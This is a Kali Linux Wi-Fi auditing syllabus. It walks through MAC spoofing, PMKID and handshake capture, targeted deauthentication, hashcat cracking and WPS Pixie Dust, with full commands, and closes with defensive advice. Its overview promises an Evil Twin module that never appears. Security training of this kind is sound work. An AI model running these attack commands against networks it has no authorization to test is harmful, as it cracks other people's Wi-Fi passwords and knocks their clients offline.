# Modern Kali Wi-Fi Pentesting Syllabus (`wifite`, `airodump-ng`, `hcxdumptool`, `hashcat`, `reaver`)

> **TL;DR:** A modern, end-to-end **Kali Linux Wireless Auditing Syllabus** covering the latest tools and workflows—from MAC spoofing and dual-band reconnaissance (`airodump-ng`, `wash`), to **clientless PMKID capture (`hcxdumptool`)**, automated auditing (**`wifite2`**), WPS Pixie Dust (**`reaver`/`bully`**), and GPU cracking (**`hcxpcapngtool` + `hashcat -m 22000`**).

> [!CAUTION]
> **Authorized Testing Only:** Wireless frames travel through shared airspace. Only run packet injection, deauthentication, or capture workflows against your own isolated lab router or targets with explicit written authorization.

---

## Syllabus Overview

| Module | Topic | Core Kali Tools |
|--------|-------|-----------------|
| **1** | Hardware Prep, MAC Spoofing & Monitor Mode | `iw`, `macchanger`, `airmon-ng` |
| **2** | Dual-Band Recon & WPS Discovery | `airodump-ng`, `wash` |
| **3** | Modern Clientless PMKID Attack (No Deauth Needed) | `hcxdumptool`, `hcxpcapngtool`, `hashcat` |
| **4** | Classic 4-Way Handshake & Targeted Deauth | `airodump-ng`, `aireplay-ng`, `mdk4` |
| **5** | Automated All-in-One Wi-Fi Auditing | `wifite` (`wifite2`) |
| **6** | WPS Pixie Dust & PIN Attacks | `reaver`, `bully` |
| **7** | WPA3 (SAE), 802.11w PMF & Evil Twin Awareness | `hostapd`, `dnsmasq`, `bettercap` |

### Install the Full Modern Kali Wi-Fi Stack
```bash
sudo apt update && sudo apt install -y \
  aircrack-ng wifite hcxdumptool hcxtools hashcat \
  reaver bully macchanger mdk4 pixiewps
```

---

## Module 1: Hardware Prep, MAC Spoofing & Monitor Mode

### Step 1: Verify Adapter Capabilities & Spoof Your MAC
```bash
# 1. Check your wireless interface name (e.g., wlan0)
iw dev

# 2. Kill NetworkManager/wpa_supplicant so they don't interfere
sudo airmon-ng check kill

# 3. Spoof a random MAC address before broadcasting anything
sudo ip link set wlan0 down
sudo macchanger -r wlan0
sudo ip link set wlan0 up

# 4. Enable monitor mode (creates wlan0mon)
sudo airmon-ng start wlan0

# 5. Test packet injection capability
sudo aireplay-ng --test wlan0mon
```
*Teaching Moment:* `macchanger -r` prevents your real hardware MAC address from appearing in target router logs during authorized assessments.

---

## Module 2: Dual-Band Recon & WPS Discovery (`airodump-ng` & `wash`)

### Step 1: Scan Both 2.4 GHz and 5 GHz Bands
```bash
sudo airodump-ng --band abg wlan0mon
```
**How to Read `airodump-ng` Columns:**
- `BSSID`: AP MAC address
- `PWR`: Signal strength (closer to `0` is stronger, e.g., `-45` is very close, `-85` is weak)
- `CH`: Channel (critical to lock onto later!)
- `ENC` / `CIPHER` / `AUTH`: Look for `WPA2 CCMP PSK` (standard), `WPA3 SAE` (modern), or `OPN` (open)
- Bottom table (`STATION`): Connected client MACs (`Probes` shows SSIDs the client is searching for!)

### Step 2: Discover WPS-Enabled Routers (`wash`)
```bash
sudo wash -i wlan0mon
```
*What to look for:* `Lck = No` means WPS is unlocked and potentially vulnerable to Pixie Dust.

---

## Module 3: Modern Clientless PMKID Capture (`hcxdumptool` + `hashcat`)

Unlike the classic 4-way handshake attack, **PMKID** attacks do **not** require any connected clients or noisy deauthentication frames—`hcxdumptool` requests the PMKID directly from the AP's RSN IE!

### Step 1: Capture PMKIDs & EAPOL Frames
```bash
# Capture all nearby AP frames into dump.pcapng (press Ctrl+C after 30–60s)
sudo hcxdumptool -i wlan0mon -w /tmp/dump.pcapng --rds=1
```

### Step 2: Convert `.pcapng` to Hashcat `22000` Format & Crack
```bash
# Extract crackable WPA-PBKDF2-PMKID+EAPOL hashes
hcxpcapngtool -o /tmp/wifi_hashes.hc22000 /tmp/dump.pcapng

# Crack using Hashcat mode 22000 (the modern unified WPA/WPA2 mode)
hashcat -m 22000 /tmp/wifi_hashes.hc22000 /usr/share/wordlists/rockyou.txt --force

# View cracked passwords
hashcat -m 22000 /tmp/wifi_hashes.hc22000 --show
```
*Teaching Moment:* Mode `-m 22000` replaced the legacy `-m 2500` (`.hccapx`) and `-m 16800` modes in modern Hashcat, handling both handshakes and PMKIDs seamlessly.

---

## Module 4: Classic 4-Way Handshake & Targeted Deauth (`airodump-ng` + `aireplay-ng`)

### Step 1: Lock Onto Target Channel & BSSID
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/target_cap wlan0mon
```

### Step 2: Force Client Reconnection (In a Second Terminal)
```bash
# Send 5 targeted deauth frames between AP (-a) and Client (-c)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```
*Watch Terminal 1:* `[ WPA handshake: AA:BB:CC:DD:EE:FF ]` confirms capture. Crack with `hcxpcapngtool` + `hashcat -m 22000` or `aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/target_cap-01.cap`.

---

## Module 5: Automated All-in-One Auditing with `wifite` (`wifite2`)

`wifite` automates monitor mode, scanning, clientless PMKID capture, WPS Pixie Dust, deauth + handshake capture, and cracking in a single interactive CLI.

### Essential `wifite` Commands & Flags
| Command | What It Does |
|---------|--------------|
| `sudo wifite --kill` | Standard automated scan & attack (kills interfering processes automatically) |
| `sudo wifite -5 --kill` | Include **5 GHz** channels alongside 2.4 GHz |
| `sudo wifite --pmkid --kill` | Focus **only** on clientless PMKID attacks (stealthier, no deauths) |
| `sudo wifite --wps-only --pixie` | Target only WPS-enabled routers using Pixie Dust |
| `sudo wifite --no-wps --dict /usr/share/wordlists/rockyou.txt` | Skip slow WPS brute-force and crack captured handshakes with `rockyou.txt` |

### Step-by-Step `wifite` Lab Execution
```bash
# 1. Launch wifite on your isolated lab network
sudo wifite -5 --kill --dict /usr/share/wordlists/rockyou.txt

# 2. Wait 10–20 seconds for APs to appear, then press Ctrl+C to stop scanning
# 3. Type the target number (e.g., 1) and press Enter
# 4. wifite automatically runs: WPS Pixie Dust -> PMKID -> Handshake Deauth -> Crack!
```

---

## Module 6: WPS Pixie Dust & PIN Attacks (`reaver` & `bully`)

```bash
# Test WPS Pixie Dust (-K 1) against a vulnerable lab AP on channel 6
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv

# Alternative using bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d
```

---

## Module 7: Restore Normal Networking on Kali
Always clean up monitor mode when finished:
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

---

## Defensive Takeaways (How Blue Teams Stop These Attacks)
- **Upgrade to WPA3-Personal (SAE):** Replaces the 4-way PSK handshake with Simultaneous Authentication of Equals—immune to offline dictionary cracking of captured handshakes/PMKIDs.
- **Enable 802.11w (PMF):** Prevents `aireplay-ng` / `mdk4` deauthentication spoofing.
- **Disable WPS:** Completely eliminates Pixie Dust and PIN brute-force attacks.
- **Use 16+ Character Passphrases:** Even if a WPA2 PMKID is captured, offline GPU cracking against `rockyou.txt` fails.
